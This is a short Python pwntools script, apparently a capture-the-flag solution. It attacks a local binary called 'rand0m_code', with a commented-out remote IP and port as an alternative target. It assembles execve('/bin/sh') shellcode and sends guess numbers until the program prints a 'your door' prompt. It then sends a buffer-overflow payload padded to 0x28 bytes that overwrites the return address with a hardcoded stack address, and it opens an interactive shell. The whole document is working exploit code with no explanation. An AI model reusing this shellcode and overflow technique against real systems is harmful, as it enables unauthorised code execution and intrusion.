from pwn import *

io = process('./rand0m_code')
#io = remote('47.92.207.120',24685)
context.log_level = 'debug'
raw_input()
context.arch = 'amd64'

sc = asm('''
        mov rbx, 0x68732f6e69622f 
        push rbx 
        mov rdi, rsp 
        xor rsi, rsi 
        xor rdx, rdx 
        mov rax, 0x3b 
        syscall
                 ''')

io.sendline(b'1')
for i in range(50):
    judge = io.recvline()
    #print(judge)
    if(judge == b'your door\n'):
        payload = sc
        sc_addr = 0x7ffd827bdc58
        payload = payload.ljust(0x28,b'\x61')
        payload += p64(sc_addr)
        io.send(payload)
        io.interactive()
        break
    if(judge == b'please input a guess num:\n'):
        io.sendline(str(i))

